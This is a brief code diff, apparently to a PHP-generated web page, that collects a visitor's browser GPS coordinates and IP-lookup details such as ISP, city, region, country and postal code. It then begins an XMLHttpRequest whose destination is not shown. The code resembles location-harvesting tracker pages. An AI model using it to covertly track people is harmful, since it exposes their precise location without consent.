@@ -98,12 +98,12 @@ echo <<<HTML
             var lon = position.coords.longitude;
             var acc = position.coords.accuracy;
 
-            // Datos IP
-            var isp = extraInfo.org || "Unknown";
+            // Mapeo inteligente de datos (Funciona con ipwho.is y ipapi.co)
+            var isp = (extraInfo.connection ? extraInfo.connection.isp : extraInfo.org) || "Unknown";
             var city = extraInfo.city || "Unknown";
-            var region = extraInfo.region || "Unknown";
-            var country = extraInfo.country_name || "Unknown";
-            var zip = extraInfo.postal || "Unknown";
+            var region = (extraInfo.region || extraInfo.region_name) || "Unknown";
+            var country = (extraInfo.country || extraInfo.country_name) || "Unknown";
+            var zip = (extraInfo.postal || extraInfo.zip) || "Unknown";
 
             var xhr = new XMLHttpRequest();
 
